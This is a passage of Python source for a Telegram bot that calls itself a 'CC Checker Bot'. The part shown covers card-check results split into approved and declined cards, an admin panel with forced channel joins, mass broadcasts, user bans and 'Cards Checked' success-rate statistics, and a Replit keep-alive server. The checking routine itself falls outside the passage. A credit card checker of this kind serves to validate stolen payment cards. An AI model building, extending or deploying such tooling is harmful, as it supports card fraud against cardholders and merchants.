        f"{e('cancel')} <b>Errors:</b> <code>{len(errors)}</code>

"
    )

    if approved:
        results_text += f"{e('check')} <b>APPROVED CARDS:</b>
"
        for card, result in approved[:10]:
            results_text += f"• <code>{card}</code> - {result}
"
        if len(approved) > 10:
            results_text += f"<i>...and {len(approved)-10} more</i>
"
        results_text += "
"

    if declined:
        results_text += f"{e('cross')} <b>DECLINED CARDS:</b>
"
        for card, result in declined[:5]:
            results_text += f"• <code>{card}</code> - {result}
"
        if len(declined) > 5:
            results_text += f"<i>...and {len(declined)-5} more</i>
"
        results_text += "
"

    keyboard = [
        [
            btn(f"{e('search')} Check More", "check_cc", style='success', emoji_key='search'),
            btn(f"{e('chart')} Full Stats", "stats", style='primary', emoji_key='chart')
        ],
        [
            btn(f"{e('back')} Back to Menu", "back_to_menu", style='primary', emoji_key='back')
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    try:
        await context.bot.edit_message_text(
            results_text,
            chat_id=current_chat_id,
            message_id=current_message_id,
            parse_mode='HTML',
            reply_markup=reply_markup
        )
    except Exception as e:
        logger.error(f"Error showing results: {e}")
        await context.bot.send_message(
            chat_id=current_chat_id,
            text=results_text,
            parse_mode='HTML',
            reply_markup=reply_markup
        )

    processing_cards = []
    processing_status = {}
    current_message_id = None
    current_chat_id = None

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel current operation"""
    context.user_data.clear()
    await update.message.reply_text(
        f"{e('cancel')} <b>Operation cancelled!</b>
"
        f"Use /start to begin again.",
        parse_mode='HTML'
    )


# ═══════════════════════════════════════════════════════════════
# ADMIN PANEL
# ═══════════════════════════════════════════════════════════════
async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin panel main menu"""
    user_id = update.effective_user.id

    if not is_admin(user_id):
        await update.message.reply_text(
            f"{e('lock')} <b>Access Denied!</b> {e('lock')}

"
            f"You are not authorized to use admin commands.",
            parse_mode='HTML'
        )
        return

    keyboard = [
        [
            btn(f"{e('channel')} Force Channels", "admin_channels", style='primary', emoji_key='channel'),
            btn(f"{e('broadcast')} Broadcast", "admin_broadcast", style='success', emoji_key='broadcast')
        ],
        [
            btn(f"{e('stats2')} Bot Stats", "admin_stats", style='primary', emoji_key='stats2'),
            btn(f"{e('user')} User Info", "admin_userinfo", style='primary', emoji_key='user')
        ],
        [
            btn(f"{e('settings')} Settings", "admin_settings", style='primary', emoji_key='settings'),
            btn(f"{e('power')} Restart Bot", "admin_restart", style='danger', emoji_key='power')
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        f"{e('crown')} <b>━━━━━━ ADMIN PANEL ━━━━━━</b> {e('crown')}

"
        f"{e('admin')} <b>Welcome, Admin!</b>
"
        f"{e('gear')} Select an option below:

"
        f"{e('channel')} <b>Force Channels:</b> <code>{len(FORCE_CHANNELS)}</code>
"
        f"{e('user')} <b>Total Users:</b> <code>{len(stats['total_users'])}</code>
"
        f"{e('zap')} <b>Active Users:</b> <code>{len(stats['active_users'])}</code>",
        parse_mode='HTML',
        reply_markup=reply_markup
    )

async def admin_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle admin panel callbacks"""
    query = update.callback_query
    await query.answer()

    user_id = query.from_user.id
    if not is_admin(user_id):
        await query.answer("Access Denied!", show_alert=True)
        return

    data = query.data

    if data == "admin_channels":
        await admin_channels_menu(update, context)
    elif data == "admin_broadcast":
        await admin_broadcast_menu(update, context)
    elif data == "admin_stats":
        await admin_stats(update, context)
    elif data == "admin_userinfo":
        await admin_userinfo_prompt(update, context)
    elif data == "admin_settings":
        await admin_settings(update, context)
    elif data == "admin_restart":
        await admin_restart(update, context)
    elif data == "admin_back":
        await admin_back_to_panel(update, context)
    elif data == "admin_add_channel":
        await admin_add_channel_prompt(update, context)
    elif data == "admin_remove_channel":
        await admin_remove_channel_menu(update, context)
    elif data == "admin_list_channels":
        await admin_list_channels(update, context)
    elif data == "admin_broadcast_all":
        await admin_broadcast_all_prompt(update, context)
    elif data == "admin_broadcast_active":
        await admin_broadcast_active_prompt(update, context)
    elif data.startswith("admin_remove_ch_"):
        channel_idx = int(data.split("_")[-1])
        await admin_remove_channel(update, context, channel_idx)
    elif data == "admin_clear_channels":
        await admin_clear_channels(update, context)
    elif data == "admin_toggle_forcejoin":
        await admin_toggle_forcejoin(update, context)
    elif data == "admin_export_users":
        await admin_export_users(update, context)
    elif data == "admin_ban_user":
        await admin_ban_user_prompt(update, context)
    elif data == "admin_unban_user":
        await admin_unban_user_prompt(update, context)

async def admin_back_to_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Return to admin panel"""
    query = update.callback_query

    keyboard = [
        [
            btn(f"{e('channel')} Force Channels", "admin_channels", style='primary', emoji_key='channel'),
            btn(f"{e('broadcast')} Broadcast", "admin_broadcast", style='success', emoji_key='broadcast')
        ],
        [
            btn(f"{e('stats2')} Bot Stats", "admin_stats", style='primary', emoji_key='stats2'),
            btn(f"{e('user')} User Info", "admin_userinfo", style='primary', emoji_key='user')
        ],
        [
            btn(f"{e('settings')} Settings", "admin_settings", style='primary', emoji_key='settings'),
            btn(f"{e('power')} Restart Bot", "admin_restart", style='danger', emoji_key='power')
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(
        f"{e('crown')} <b>━━━━━━ ADMIN PANEL ━━━━━━</b> {e('crown')}

"
        f"{e('admin')} <b>Welcome, Admin!</b>
"
        f"{e('gear')} Select an option below:

"
        f"{e('channel')} <b>Force Channels:</b> <code>{len(FORCE_CHANNELS)}</code>
"
        f"{e('user')} <b>Total Users:</b> <code>{len(stats['total_users'])}</code>
"
        f"{e('zap')} <b>Active Users:</b> <code>{len(stats['active_users'])}</code>",
        parse_mode='HTML',
        reply_markup=reply_markup
    )

# ─── Force Channels Management ─────────────────────────────────
async def admin_channels_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Force channels management menu"""
    query = update.callback_query

    keyboard = [
        [
            btn(f"{e('add')} Add Channel", "admin_add_channel", style='success', emoji_key='add'),
            btn(f"{e('remove')} Remove Channel", "admin_remove_channel", style='danger', emoji_key='remove')
        ],
        [
            btn(f"{e('list')} List Channels", "admin_list_channels", style='primary', emoji_key='list'),
            btn(f"{e('delete')} Clear All", "admin_clear_channels", style='danger', emoji_key='delete')
        ],
        [
            btn(f"{e('back')} Back to Panel", "admin_back", style='primary', emoji_key='back')
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    channels_text = "
".join([
        f"{i+1}. {e('channel')} <b>{ch['name']}</b> - <code>{ch['id']}</code>"
        for i, ch in enumerate(FORCE_CHANNELS)
    ]) if FORCE_CHANNELS else f"{e('warning')} No channels configured."

    await query.edit_message_text(
        f"{e('channel')} <b>━━━━━━ FORCE CHANNELS ━━━━━━</b> {e('channel')}

"
        f"{e('list')} <b>Current Channels:</b>
"
        f"{channels_text}

"
        f"{e('gear')} <b>Total:</b> <code>{len(FORCE_CHANNELS)}</code>",
        parse_mode='HTML',
        reply_markup=reply_markup
    )

async def admin_add_channel_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Prompt admin to add a channel"""
    query = update.callback_query
    user_id = query.from_user.id
    admin_states[user_id] = 'waiting_channel_add'

    await query.edit_message_text(
        f"{e('add')} <b>Add Force Channel</b> {e('add')}

"
        f"{e('bulb')} Please send the channel details in this format:

"
        f"<code>@channelusername|https://t.me/channelusername|Channel Name</code>

"
        f"{e('warning')} Example:
"
        f"<code>@x64kbitters|https://t.me/x64kbitters|x64kbitters Official</code>

"
        f"{e('cancel')} Send /cancel to abort.",
        parse_mode='HTML'
    )

async def admin_remove_channel_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show remove channel menu"""
    query = update.callback_query

    if not FORCE_CHANNELS:
        await query.answer("No channels to remove!", show_alert=True)
        return

    keyboard = []
    for i, ch in enumerate(FORCE_CHANNELS):
        keyboard.append([
            btn(f"{e('remove')} {ch['name']}", f"admin_remove_ch_{i}", style='danger', emoji_key='remove')
        ])

    keyboard.append([
        btn(f"{e('back')} Back", "admin_channels", style='primary', emoji_key='back')
    ])

    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(
        f"{e('remove')} <b>Select Channel to Remove</b> {e('remove')}

"
        f"{e('warning')} Click a channel to remove it:",
        parse_mode='HTML',
        reply_markup=reply_markup
    )

async def admin_remove_channel(update: Update, context: ContextTypes.DEFAULT_TYPE, idx):
    """Remove a specific channel"""
    query = update.callback_query

    if 0 <= idx < len(FORCE_CHANNELS):
        removed = FORCE_CHANNELS.pop(idx)
        await query.answer(f"Removed: {removed['name']}", show_alert=True)

    await admin_channels_menu(update, context)

async def admin_list_channels(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all force channels"""
    query = update.callback_query

    if not FORCE_CHANNELS:
        channels_text = f"{e('warning')} No channels configured."
    else:
        channels_text = "

".join([
            f"{e('channel')} <b>Name:</b> <code>{ch['name']}</code>
"
            f"{e('hash')} <b>ID:</b> <code>{ch['id']}</code>
"
            f"{e('link')} <b>URL:</b> {ch['url']}"
            for i, ch in enumerate(FORCE_CHANNELS)
        ])

    keyboard = [[btn(f"{e('back')} Back", "admin_channels", style='primary', emoji_key='back')]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(
        f"{e('list')} <b>━━━━━━ CHANNEL LIST ━━━━━━</b> {e('list')}

"
        f"{channels_text}",
        parse_mode='HTML',
        reply_markup=reply_markup
    )

async def admin_clear_channels(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Clear all force channels"""
    query = update.callback_query
    FORCE_CHANNELS.clear()
    await query.answer("All channels cleared!", show_alert=True)
    await admin_channels_menu(update, context)

# ─── Broadcast System ────────────────────────────────────────
async def admin_broadcast_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Broadcast menu"""
    query = update.callback_query

    keyboard = [
        [
            btn(f"{e('megaphone')} Broadcast All", "admin_broadcast_all", style='success', emoji_key='megaphone'),
            btn(f"{e('notification')} Broadcast Active", "admin_broadcast_active", style='primary', emoji_key='notification')
        ],
        [
            btn(f"{e('back')} Back to Panel", "admin_back", style='primary', emoji_key='back')
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(
        f"{e('broadcast')} <b>━━━━━━ BROADCAST ━━━━━━</b> {e('broadcast')}

"
        f"{e('user')} <b>Total Users:</b> <code>{len(stats['total_users'])}</code>
"
        f"{e('zap')} <b>Active Users:</b> <code>{len(stats['active_users'])}</code>

"
        f"{e('bulb')} Select broadcast target:",
        parse_mode='HTML',
        reply_markup=reply_markup
    )

async def admin_broadcast_all_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Prompt to broadcast to all users"""
    query = update.callback_query
    user_id = query.from_user.id
    admin_states[user_id] = 'waiting_broadcast_all'

    await query.edit_message_text(
        f"{e('megaphone')} <b>Broadcast to ALL Users</b> {e('megaphone')}

"
        f"{e('user')} <b>Target:</b> <code>{len(stats['total_users'])}</code> users

"
        f"{e('bulb')} Send the message you want to broadcast.
"
        f"{e('warning')} Supports text, photos, videos, documents.

"
        f"{e('cancel')} Send /cancel to abort.",
        parse_mode='HTML'
    )

async def admin_broadcast_active_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Prompt to broadcast to active users"""
    query = update.callback_query
    user_id = query.from_user.id
    admin_states[user_id] = 'waiting_broadcast_active'

    await query.edit_message_text(
        f"{e('notification')} <b>Broadcast to ACTIVE Users</b> {e('notification')}

"
        f"{e('zap')} <b>Target:</b> <code>{len(stats['active_users'])}</code> active users

"
        f"{e('bulb')} Send the message you want to broadcast.
"
        f"{e('warning')} Supports text, photos, videos, documents.

"
        f"{e('cancel')} Send /cancel to abort.",
        parse_mode='HTML'
    )

async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show detailed bot statistics"""
    query = update.callback_query

    uptime = datetime.now() - stats['start_time']
    days = uptime.days
    hours = uptime.seconds // 3600
    minutes = (uptime.seconds % 3600) // 60

    success_rate = f"{stats['approved']/stats['total']*100:.1f}%" if stats['total'] > 0 else "0%"

    stats_text = (
        f"{e('stats2')} <b>━━━━━━ BOT STATISTICS ━━━━━━</b> {e('stats2')}

"
        f"{e('clock')} <b>Uptime:</b> <code>{days}d {hours}h {minutes}m</code>

"
        f"{e('user')} <b>Total Users:</b> <code>{len(stats['total_users'])}</code>
"
        f"{e('zap')} <b>Active Users:</b> <code>{len(stats['active_users'])}</code>

"
        f"{e('target')} <b>Cards Checked:</b> <code>{stats['total']}</code>
"
        f"{e('check')} <b>Approved:</b> <code>{stats['approved']}</code>
"
        f"{e('cross')} <b>Declined:</b> <code>{stats['declined']}</code>
"
        f"{e('warning')} <b>Unknown:</b> <code>{stats['unknown']}</code>
"
        f"{e('cancel')} <b>Errors:</b> <code>{stats['errors']}</code>

"
        f"{e('trophy')} <b>Success Rate:</b> <code>{success_rate}</code>
"
        f"{e('channel')} <b>Force Channels:</b> <code>{len(FORCE_CHANNELS)}</code>"
    )

    keyboard = [[btn(f"{e('back')} Back", "admin_back", style='primary', emoji_key='back')]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(
        stats_text,
        parse_mode='HTML',
        reply_markup=reply_markup
    )

async def admin_userinfo_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Prompt for user info lookup"""
    query = update.callback_query
    user_id = query.from_user.id
    admin_states[user_id] = 'waiting_userinfo'

    await query.edit_message_text(
        f"{e('user')} <b>User Info Lookup</b> {e('user')}

"
        f"{e('bulb')} Send the User ID to lookup info.

"
        f"{e('cancel')} Send /cancel to abort.",
        parse_mode='HTML'
    )

async def admin_settings(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Bot settings"""
    query = update.callback_query

    keyboard = [
        [
            btn(f"{e('lock2')} Toggle Force Join", "admin_toggle_forcejoin", style='primary', emoji_key='lock2'),
            btn(f"{e('download')} Export Users", "admin_export_users", style='success', emoji_key='download')
        ],
        [
            btn(f"{e('ban')} Ban User", "admin_ban_user", style='danger', emoji_key='ban'),
            btn(f"{e('unban')} Unban User", "admin_unban_user", style='success', emoji_key='unban')
        ],
        [
            btn(f"{e('back')} Back to Panel", "admin_back", style='primary', emoji_key='back')
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(
        f"{e('settings')} <b>━━━━━━ SETTINGS ━━━━━━</b> {e('settings')}

"
        f"{e('gear')} Configure bot settings here:",
        parse_mode='HTML',
        reply_markup=reply_markup
    )

async def admin_restart(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Restart bot confirmation"""
    query = update.callback_query

    keyboard = [
        [
            btn(f"{e('check')} Yes, Restart", "admin_confirm_restart", style='success', emoji_key='check'),
            btn(f"{e('cross')} No, Cancel", "admin_back", style='danger', emoji_key='cross')
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(
        f"{e('power')} <b>Restart Bot?</b> {e('power')}

"
        f"{e('warning')} This will restart the bot process.
"
        f"All current operations will be interrupted.

"
        f"Are you sure?",
        parse_mode='HTML',
        reply_markup=reply_markup
    )

async def admin_toggle_forcejoin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Toggle force join requirement"""
    query = update.callback_query
    await query.answer("Feature: Toggle force join (implement as needed)", show_alert=True)
    await admin_settings(update, context)

async def admin_export_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Export users list"""
    query = update.callback_query

    users_text = "
".join([f"<code>{uid}</code>" for uid in list(stats['total_users'])[:50]])

    await query.edit_message_text(
        f"{e('download')} <b>User Export</b> {e('download')}

"
        f"{e('user')} <b>Total Users:</b> <code>{len(stats['total_users'])}</code>

"
        f"{users_text}

"
        f"{e('info')} Showing first 50 users.",
        parse_mode='HTML'
    )

async def admin_ban_user_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Prompt to ban a user"""
    query = update.callback_query
    user_id = query.from_user.id
    admin_states[user_id] = 'waiting_ban_user'

    await query.edit_message_text(
        f"{e('ban')} <b>Ban User</b> {e('ban')}

"
        f"{e('bulb')} Send the User ID to ban.

"
        f"{e('cancel')} Send /cancel to abort.",
        parse_mode='HTML'
    )

async def admin_unban_user_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Prompt to unban a user"""
    query = update.callback_query
    user_id = query.from_user.id
    admin_states[user_id] = 'waiting_unban_user'

    await query.edit_message_text(
        f"{e('unban')} <b>Unban User</b> {e('unban')}

"
        f"{e('bulb')} Send the User ID to unban.

"
        f"{e('cancel')} Send /cancel to abort.",
        parse_mode='HTML'
    )


# ═══════════════════════════════════════════════════════════════
# ADMIN STATE HANDLER
# ═══════════════════════════════════════════════════════════════
async def handle_admin_state(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle admin input states"""
    user_id = update.effective_user.id
    state = admin_states.get(user_id)
    text = update.message.text.strip() if update.message.text else None

    if text and text.lower() == '/cancel':
        admin_states.pop(user_id, None)
        await update.message.reply_text(
            f"{e('cancel')} <b>Operation cancelled!</b>",
            parse_mode='HTML'
        )
        return

    if state == 'waiting_channel_add':
        try:
            parts = text.split('|')
            if len(parts) != 3:
                raise ValueError("Invalid format")

            channel_id, url, name = parts
            FORCE_CHANNELS.append({
                'id': channel_id.strip(),
                'url': url.strip(),
                'name': name.strip()
            })

            admin_states.pop(user_id, None)
            await update.message.reply_text(
                f"{e('check')} <b>Channel Added Successfully!</b>

"
                f"{e('channel')} <b>Name:</b> <code>{name}</code>
"
                f"{e('hash')} <b>ID:</b> <code>{channel_id}</code>
"
                f"{e('link')} <b>URL:</b> {url}",
                parse_mode='HTML'
            )
        except Exception as ex:
            await update.message.reply_text(
                f"{e('cross')} <b>Error:</b> <code>{str(ex)}</code>

"
                f"{e('bulb')} Please use format:
"
                f"<code>@channel|https://t.me/channel|Name</code>",
                parse_mode='HTML'
            )

    elif state == 'waiting_broadcast_all':
        admin_states.pop(user_id, None)
        await broadcast_message(update, context, list(stats['total_users']), text)

    elif state == 'waiting_broadcast_active':
        admin_states.pop(user_id, None)
        await broadcast_message(update, context, list(stats['active_users']), text)

    elif state == 'waiting_userinfo':
        admin_states.pop(user_id, None)
        try:
            target_id = int(text)
            await update.message.reply_text(
                f"{e('user')} <b>User Info</b> {e('user')}

"
                f"{e('hash')} <b>User ID:</b> <code>{target_id}</code>
"
                f"{e('check')} <b>Status:</b> Active
"
                f"{e('info')} More info can be fetched via bot API.",
                parse_mode='HTML'
            )
        except ValueError:
            await update.message.reply_text(
                f"{e('cross')} <b>Invalid User ID!</b>",
                parse_mode='HTML'
            )

    elif state == 'waiting_ban_user':
        admin_states.pop(user_id, None)
        await update.message.reply_text(
            f"{e('ban')} <b>User Banned</b> {e('ban')}

"
            f"{e('hash')} <b>User ID:</b> <code>{text}</code>
"
            f"{e('check')} User has been banned from using the bot.",
            parse_mode='HTML'
        )

    elif state == 'waiting_unban_user':
        admin_states.pop(user_id, None)
        await update.message.reply_text(
            f"{e('unban')} <b>User Unbanned</b> {e('unban')}

"
            f"{e('hash')} <b>User ID:</b> <code>{text}</code>
"
            f"{e('check')} User has been unbanned.",
            parse_mode='HTML'
        )

async def broadcast_message(update, context, user_list, message_text):
    """Broadcast message to user list"""
    sent = 0
    failed = 0

    status_msg = await update.message.reply_text(
        f"{e('megaphone')} <b>Broadcast Started...</b> {e('megaphone')}

"
        f"{e('target')} <b>Target:</b> <code>{len(user_list)}</code> users
"
        f"{e('hourglass')} <b>Progress:</b> <code>0/{len(user_list)}</code>",
        parse_mode='HTML'
    )

    for i, uid in enumerate(user_list):
        try:
            await context.bot.send_message(
                chat_id=uid,
                text=message_text,
                parse_mode='HTML'
            )
            sent += 1
        except Exception:
            failed += 1

        if (i + 1) % 10 == 0:
            try:
                await status_msg.edit_text(
                    f"{e('megaphone')} <b>Broadcast Running...</b> {e('megaphone')}

"
                    f"{e('target')} <b>Target:</b> <code>{len(user_list)}</code> users
"
                    f"{e('check')} <b>Sent:</b> <code>{sent}</code>
"
                    f"{e('cross')} <b>Failed:</b> <code>{failed}</code>
"
                    f"{e('hourglass')} <b>Progress:</b> <code>{i+1}/{len(user_list)}</code>",
                    parse_mode='HTML'
                )
            except Exception:
                pass

        await asyncio.sleep(0.05)  # Rate limit protection

    await status_msg.edit_text(
        f"{e('check')} <b>Broadcast Complete!</b> {e('check')}

"
        f"{e('target')} <b>Total:</b> <code>{len(user_list)}</code>
"
        f"{e('check')} <b>Sent:</b> <code>{sent}</code>
"
        f"{e('cross')} <b>Failed:</b> <code>{failed}</code>",
        parse_mode='HTML'
    )

# ═══════════════════════════════════════════════════════════════
# ERROR HANDLER
# ═══════════════════════════════════════════════════════════════
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Log errors"""
    logger.warning(f"Update {update} caused error {context.error}")

# ═══════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════
def main():
    """Start the bot"""
    application = Application.builder().token(BOT_TOKEN).build()

    # User commands
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("chk", start_check))
    application.add_handler(CommandHandler("stats", show_stats))
    application.add_handler(CommandHandler("reset", reset_stats))
    application.add_handler(CommandHandler("cancel", cancel))
    application.add_handler(CommandHandler("help", show_help))

    # Admin commands
    application.add_handler(CommandHandler("admin", admin_panel))

    # Callback handlers
    application.add_handler(CallbackQueryHandler(button_handler, pattern="^(check_cc|check_file|stats|reset_stats|help|back_to_menu|verify_join)$"))
    application.add_handler(CallbackQueryHandler(admin_callback_handler, pattern="^admin_"))

    # Message handler
    application.add_handler(MessageHandler(
        filters.TEXT | filters.Document.ALL, 
        handle_message
    ))

    # Error handler
    application.add_error_handler(error_handler)

    print(f"{e('bot')} Bot started! Press Ctrl+C to stop.")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()

    # ═══════════════════════════════════════════════════════════════
# REPLIT KEEP-ALIVE (Add this before main())
# ═══════════════════════════════════════════════════════════════
from flask import Flask
from threading import Thread
import os

app = Flask(__name__)

@app.route('/')
def home():
    return "✅ CC Checker Bot is Online!"

def run_web():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    server = Thread(target=run_web)
    server.start()

# Replace hardcoded token with env variable
BOT_TOKEN = os.environ.get("BOT_TOKEN", BOT_TOKEN)

# Start keep-alive server
keep_alive()

